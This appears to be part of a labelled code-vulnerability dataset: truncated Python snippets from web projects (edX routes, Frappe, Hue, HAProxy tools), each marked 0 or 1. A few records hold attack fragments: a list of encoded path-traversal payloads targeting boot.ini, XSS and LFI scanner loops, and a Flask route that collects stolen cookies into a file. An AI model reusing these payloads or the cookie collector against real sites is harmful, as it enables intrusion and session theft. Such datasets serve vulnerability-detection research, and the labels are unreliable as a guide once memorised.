edit_workflow(request) def delete_workflow(request): if request.method !='POST': raise PopupException(_('A", "label": 0}, {"snippet_id": 11602, "code": "(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account'), url(r'^activate/(", "label": 0}, {"snippet_id": 41092, "code": " context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t", "label": 0}, {"snippet_id": 30807, "code": ".get_template('/show_compare_configs.html') \tleft=form.getvalue('left') \tright=form.getvalue('right') \t \ttemplate=template.render(serv=serv, right=right, left=left, return_files=funct.get_files())\t\t\t\t\t\t\t\t\t ", "label": 0}, {"snippet_id": 53412, "code": " @check_document_modify_permission() def save_bundle(request): response={'status': -1} bundle_data=json.loads(request.POST.get('bundle', '{}')) if bundle_data.get('id'): bundle_doc=Document2.objects.get(id=bundle_data", "label": 0}, {"snippet_id": 24178, "code": ") return expected_statement def test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self)", "label": 0}, {"snippet_id": 18493, "code": "'staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/", "label": 0}, {"snippet_id": 26807, "code": "%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e", "label": 0}, {"snippet_id": 37149, "code": "(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments=", "label": 0}, {"snippet_id": 17347, "code": "]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider", "label": 0}, {"snippet_id": 13065, "code": ", url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change", "label": 0}, {"snippet_id": 18975, "code": ".migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS", "label": 0}, {"snippet_id": 37066, "code": ".blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count", "label": 0}, {"snippet_id": 37005, "code": " route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append(", "label": 0}, {"snippet_id": 31501, "code": " \t if form.getvalue('waf_metrics'): \tfrom datetime import timedelta \tfrom bokeh.plotting import figure, output_file, show \tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker", "label": 0}, {"snippet_id": 52325, "code": " HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_modify_permission() def save_workflow(request): response={'status': -1} workflow=json.loads(request.POST.get('workflow', '{}'))", "label": 0}, {"snippet_id": 48281, "code": "\"] else: forward_url=\"/admin\" if \"rid\" not in request.GET: return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\") u: Profile=get_current_user(request) current_reservation", "label": 0}, {"snippet_id": 25895, "code": "(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')), ) elif q.type==Question.TYPE_DATETIME: field=SplitDateTimeField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser", "label": 0}, {"snippet_id": 42115, "code": "(fieldname) \t\t\tif df: \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname", "label": 0}, {"snippet_id": 45546, "code": ": bundle_id=request.GET.get('bundle') doc=None if bundle_id: doc=Document2.objects.get(id=bundle_id) bundle=Bundle(document=doc) else: bundle=Bundle() coordinators=[dict([('uuid', d.content_object.uuid", "label": 0}, {"snippet_id": 15424, "code": ".testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org', '1117'", "label": 0}, {"snippet_id": 31152, "code": " \"+interface+\" \"+vrrpip+\" \"+kp]) \t\t\t \tos.system(\"rm -f %s\" % script) \t if form.getvalue('haproxyaddserv'): \tfunct.install_haproxy(form.getvalue('haproxyaddserv'), syn_flood=form.getvalue('syn_flood')) ", "label": 0}, {"snippet_id": 23691, "code": " store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir", "label": 1}, {"snippet_id": 32777, "code": ">' '<td class=\"u-lineNum u-noSelect FileContents-lineNum\">' '<a name=\"%(num)s\" ' 'onclick=\"window.location.hash=%(quot)s '%(num)s</a></td>' '<td class=\"FileContents-lineContents\">%(line)s</td></tr>') %", "label": 0}, {"snippet_id": 41190, "code": "=get_children(), \t\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title", "label": 1}, {"snippet_id": 12330, "code": "?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/", "label": 0}, {"snippet_id": 24769, "code": ".default_store, import_dir=self.imports_dir ) ) def load_data(self): \"\"\" Loads data into database from db_fixtures \"\"\" print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE", "label": 0}, {"snippet_id": 36882, "code": ",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title", "label": 1}, {"snippet_id": 15006, "code": "\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command", "label": 0}, {"snippet_id": 2171, "code": ".headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\":", "label": 0}, {"snippet_id": 50550, "code": " through the request. It uses a long-polling mechanism to avoid sending data unless there is actual data available. Args: request(Request): Incoming request. \"\"\" dmode=request.args.get('mode',[None])[0] if", "label": 0}, {"snippet_id": 40043, "code": "(fieldname) \t\t\tif self.get(fieldname) !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0}\").format(self.meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError) \tdef _validate_length(self)", "label": 0}, {"snippet_id": 704, "code": "='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: print \"param to test\",key parsed_url=urlparse.urlparse(url) xss_url", "label": 1}, {"snippet_id": 20854, "code": "\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i", "label": 0}, {"snippet_id": 4737, "code": ", 'onoffline', 'ononline', 'onorientationchange', 'onpagehide', 'onpageshow', 'onpaste', 'onpause', 'onplay', 'onplaying', 'onpopstate', 'onprogress', 'onratechange', 'onreset', 'onresize', 'onscroll',", "label": 0}, {"snippet_id": 51938, "code": ".path.dirname(__file__)) +'/') VENDOR_DIR=os.environ.get('VENDOR_DIR', os.path.abspath(os.path.dirname(__file__) +'/../vendor/') +'/') if DEBUG: DATA_UPLOAD_MAX_NUMBER_FIELDS=10000 STATICFILES_FINDERS=", "label": 0}, {"snippet_id": 32925, "code": "(self.path.rstrip('/'), f, bold[0], f, bold[1])) self.wfile.write('<br/>\\n') for d in sorted(dirs): if d.startswith('.'): continue self.wfile.write('<a href=\"%s/%s\">%s/</a><br/>\\n' % (self.path.rstrip('/'", "label": 1}, {"snippet_id": 37252, "code": " self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro", "label": 0}, {"snippet_id": 48943, "code": "() if getattr(field, 'do_not_call_in_templates', False) else field else: display_function=getattr(self.object, 'get_%s_display' % self.column.field_name, False) value=display_function() if display_function", "label": 0}, {"snippet_id": 659, "code": " scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result", "label": 1}, {"snippet_id": 20515, "code": " ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports", "label": 0}, {"snippet_id": 24873, "code": " test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self", "label": 0}, {"snippet_id": 29614, "code": "='UTF-8') \t\telse: \t\t\treturn stdout.read().decode(encoding='UTF-8') \t\t\t \t\tfor line in stderr.read().decode(encoding='UTF-8'): \t\t\tif line: \t\t\t\tprint(\"<div class='alert alert-warning'>\"+line+\"</div>\") \ttry", "label": 0}, {"snippet_id": 7298, "code": "(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico", "label": 0}, {"snippet_id": 52733, "code": "), mimetype=\"application/json\") @check_document_access_permission() def submit_workflow(request, doc_id): workflow=Workflow(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm", "label": 0}, {"snippet_id": 44028, "code": "\tfor f, fval in iteritems(_filters): \t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]): \t\t\t\tadd=False \t\t\t\tbreak \t\tif add: \t\t\tout.append(d) \t\t\tif limit and(len(out)-1)==limit: \t\t\t\tbreak \treturn", "label": 0}, {"snippet_id": 30672, "code": ", grep_act, grep) \toutput, stderr=funct.subprocess_execute(cmd) \tfunct.show_log(output) \tprint(stderr) \t\t if serv is not None and act==\"showMap\": \tovw.get_map(serv) \t if form.getvalue('servaction') is not", "label": 0}, {"snippet_id": 29044, "code": "+tmp_config_path+\"/\"+script +\" PROXY=\" +proxy_serv+ \t\t\t\t\" SOCK_PORT=\"+haproxy_sock_port+\" STAT_PORT=\"+stats_port+\" STAT_FILE=\"+server_state_file+ \t\t\t\t\" STATS_USER=\"+stats_user+\" STATS_PASS=\"+stats_password", "label": 0}, {"snippet_id": 34816, "code": "\"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype", "label": 0}, {"snippet_id": 22480, "code": "\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx", "label": 0}, {"snippet_id": 771, "code": ".G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers", "label": 0}, {"snippet_id": 4134, "code": "(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload()", "label": 0}, {"snippet_id": 9600, "code": "'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 3771, "code": "=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url, \"POST\", headers, temp_body) decoded_payload", "label": 0}, {"snippet_id": 18061, "code": "\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$", "label": 0}, {"snippet_id": 48396, "code": ".POST or str(\"notes_\" +str(art.id)) not in request.POST: return HttpResponseRedirect(\"/admin?error=Missing%20article%20data%20in%20request\") amount=int(request.POST[\"quantity_\" +str(art.id)]) if amount >", "label": 0}, {"snippet_id": 54323, "code": "=ttk.Combobox(main, values=pl) payload.current(0) global proxy proxy=ttk.Combobox(main, values=prox) global refresh refresh=ttk.Combobox(main, values=[\"On\", \"Off\"]) global crawl crawl=ttk.Combobox(main,", "label": 0}, {"snippet_id": 44845, "code": "=parameters.union(set(find_dollar_variables(data))) response['status']=0 response['parameters']=list(parameters) except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response)", "label": 0}, {"snippet_id": 46855, "code": " return rv.decode('utf-8') @property async def html_content(self): content=await self.content if not content: return '' return markdown(content) async def clear_mc(self): for key in(MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST", "label": 1}, {"snippet_id": 32589, "code": "._DoNotFound() elif path.lower().endswith('.md'): self._DoMD(path) elif os.path.exists(full_path +'/README.md'): self._DoMD(path +'/README.md') elif path.lower().endswith('.png'): self._DoImage(full_path", "label": 0}, {"snippet_id": 46774, "code": ".react import ReactMixin, ReactItem from.signals import comment_reacted from.utils import RedisSettings markdown=mistune.Markdown() MC_KEY_COMMENT_LIST='comment:%s:comment_list' MC_KEY_N_COMMENTS='comment", "label": 0}, {"snippet_id": 52840, "code": "}, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_workflow(user, fs, jt, workflow, mapping): try: submission=Submission(user, workflow, fs,", "label": 0}, {"snippet_id": 21786, "code": "]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 39665, "code": "(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates", "label": 0}, {"snippet_id": 27070, "code": "+\".html\", \"w\") as f: f.write(r.content) for lfi_result in lfi_expect: if r.content.find(lfi_result)>=0: print \"[+] Target is VULNERABLE\" print \"Url: \" +url print \"Parameters: %s\\n\" % str(post_params) return", "label": 0}, {"snippet_id": 28396, "code": "<center><div class=\"alert alert-danger\">Check the config file. Presence section %s and parameter %s</div>' %(sec, var)) \t\t\t\t\t def get_data(type): \tfrom datetime import datetime \tfrom pytz import timezone ", "label": 0}, {"snippet_id": 39029, "code": ": \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Currency\", \"Float\"", "label": 0}, {"snippet_id": 7290, "code": "'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$", "label": 0}, {"snippet_id": 51441, "code": ".backends.database', 'jet.dashboard', 'jet', 'import_export', 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib", "label": 0}, {"snippet_id": 6371, "code": "\"\"\" Get SAML F-TICKS format string. \"\"\" return self.config.get(self.section, 'fticks_format_string') @property def static_dir(self): \"\"\" Directory with static files to be served. \"\"\" return self.config", "label": 0}, {"snippet_id": 25012, "code": " \"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params", "label": 0}, {"snippet_id": 39276, "code": " get_parentfield_of_doctype(self, doctype): \t\tfieldname=[df.fieldname for df in self.meta.get_table_fields() if df.options==doctype] \t\treturn fieldname[0] if fieldname else None \tdef db_insert(self): \t", "label": 0}, {"snippet_id": 2176, "code": "\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result", "label": 0}, {"snippet_id": 13479, "code": "/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 28690, "code": " ref) \t\t\t\t def is_admin(**kwargs): \timport sql \timport http.cookies \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid') \ttry: \t\trole=sql.get_user_role_by_uuid(user_id", "label": 0}, {"snippet_id": 49157, "code": ".column_id: new_query.append(column) if not self.is_reverse() and self.current_columns[0]==self.column_id: return self.get_url_with_query_params({ self.ordering_query_param: '-{}.{}'.format(self.column_id,", "label": 0}, {"snippet_id": 33599, "code": ": \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info", "label": 0}, {"snippet_id": 40417, "code": "(fieldname)): \t\t\treturn self.get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception) \tdef is_dummy_password(self, pwd): \t\treturn ''.join(set(pwd))=='*", "label": 0}, {"snippet_id": 6824, "code": " a given month. This is said to be an imminent Kantara requirement. \"\"\" return self.config.getint(self.section, 'max_authn_failures_per_month') @property def login_state_ttl(self): \"\"\" Lifetime of state", "label": 0}, {"snippet_id": 37774, "code": "(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse:", "label": 0}, {"snippet_id": 21250, "code": "'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 1}, {"snippet_id": 37622, "code": "\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger", "label": 0}, {"snippet_id": 27140, "code": " hidden_param_value, form_counter, url) params=[] hidden_param_name=[] hidden_param_value=[] page=\"\" if has_form==1: m_input=re.match(r'.*\\<(input|button)\\s[^\\>]*name=\"(\\w+)\"', line, re.M|re.I) if m_input: m_value", "label": 1}, {"snippet_id": 12435, "code": "]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$", "label": 0}, {"snippet_id": 14446, "code": ".view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS')", "label": 0}, {"snippet_id": 53984, "code": ",methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n-------", "label": 0}, {"snippet_id": 50642, "code": "-specific internal representation of the browser session. \"\"\" if self.csessid: return _CLIENT_SESSIONS(session_key=self.csessid) def disconnect(self, reason=\"Server disconnected.\"): \"\"\" Disconnect from", "label": 0}, {"snippet_id": 12385, "code": ", name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$", "label": 0}, {"snippet_id": 39491, "code": ".label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef update_modified(self): \t\t'''Update modified timestamp'", "label": 0}, {"snippet_id": 14538, "code": " \"\"\" import os import unittest from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite,", "label": 0}, {"snippet_id": 52901, "code": ":list_oozie_workflow', kwargs={'job_id': job_id})) def list_editor_coordinators(request): coordinators=[d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2'", "label": 0}, {"snippet_id": 44985, "code": ") request.info(_('Workflow submitted')) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else:", "label": 0}, {"snippet_id": 15945, "code": " the test course from github...\") print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test", "label": 0}, {"snippet_id": 27091, "code": "(post_params) return return def scan_for_forms(fname, host, url): print \"[+] Start scan\" rtype=\"\" has_form=0 params=[] hidden_param_name=[] hidden_param_value=[] page=\"\" form_counter=0 try: with open(fname,", "label": 1}, {"snippet_id": 29892, "code": "'getcert') \tcert_path=sql.get_setting('cert_path') \tcommands=[ \"cat \"+cert_path+\"/\"+id] \ttry: \t\tfunct.ssh_command(serv, commands, ip=\"1\") \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\"", "label": 0}, {"snippet_id": 17594, "code": ".update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url", "label": 0}, {"snippet_id": 7244, "code": " not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name", "label": 0}, {"snippet_id": 22145, "code": " urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),", "label": 0}, {"snippet_id": 23516, "code": "), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores", "label": 0}, {"snippet_id": 50872, "code": " cmdname, *args, **kwargs): \"\"\" Data Evennia -> User. Args: cmdname(str): The first argument will always be the oob cmd name. *args(any): Remaining args will be arguments for `cmd`. Kwargs: options(dict)", "label": 0}, {"snippet_id": 15741, "code": " composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir ", "label": 0}, {"snippet_id": 31982, "code": ".initialize(\"ldap://\"+server+':'+port) \ttry: \t\tl.protocol_version=ldap.VERSION3 \t\tl.set_option(ldap.OPT_REFERRALS, 0) \t\tbind=l.simple_bind_s(user, password) \t\tcriteria=\"(&(objectClass=user)(sAMAccountName", "label": 0}, {"snippet_id": 18723, "code": " settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+", "label": 0}, {"snippet_id": 7062, "code": "'^create_account$', 'student.views.create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$',", "label": 0}, {"snippet_id": 19625, "code": " test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course", "label": 0}, {"snippet_id": 34158, "code": "*class** object of the given DocType. \tFor `custom` type, returns `frappe.model.document.Document`. \t:param doctype: DocType name as string.\"\"\" \tfrom frappe.model.document import Document \tglobal _classes ", "label": 0}, {"snippet_id": 18553, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 30481, "code": " %s:00/! d' |tail -%s %s %s\" %(serv, date, date1, rows, grep_act, grep)] \t\tsyslog_server=sql.get_setting('syslog_server') \t \tif waf==\"1\": \t\tlocal_path_logs='/var/log/modsec_audit.log' \t\tcommands=[ \"sudo", "label": 0}, {"snippet_id": 54768, "code": " form_class=ArticleForm success_url='/' def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['is_mobile']=is_mobile(self.request.META['HTTP_USER_AGENT']) return context", "label": 0}, {"snippet_id": 52419, "code": "=workflow['name'] workflow_doc.save() workflow_instance=Workflow(document=workflow_doc) response['status']=0 response['id']=workflow_doc.id response['doc1_id']=workflow_doc.doc.get().id response['message", "label": 0}, {"snippet_id": 13885, "code": ", 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses", "label": 0}, {"snippet_id": 44484, "code": ".owner=request.user doc2.save() doc2.doc.all().delete() doc2.doc.add(copy_doc) workflow=Workflow(document=doc2) workflow.update_name(name) doc2.update_data({'workflow': workflow.get_data()['workflow']})", "label": 0}, {"snippet_id": 24966, "code": " self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect", "label": 0}, {"snippet_id": 13493, "code": ")), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern()))", "label": 0}, {"snippet_id": 22894, "code": ", name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id", "label": 1}, {"snippet_id": 29710, "code": " \toutput, stderr=subprocess_execute(cmd) \tret=\"\" \tfor line in output: \t\tif \" \t\t\tcontinue \t\tif line !=\"\": \t\t\tback=json.dumps(line).split(\"\\\"\") \t\t\tif kwargs.get('ret'): \t\t\t\tret +=back[1] \t\t\t\tret +=\"<br /", "label": 0}, {"snippet_id": 40135, "code": "}{1}\".format(_(self.doctype), self.name) \t\t\t\t\tfrappe.throw(_(\"{0}: '{1}'({3}) will get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError", "label": 0}, {"snippet_id": 9828, "code": "=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores", "label": 0}, {"snippet_id": 8897, "code": "=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import 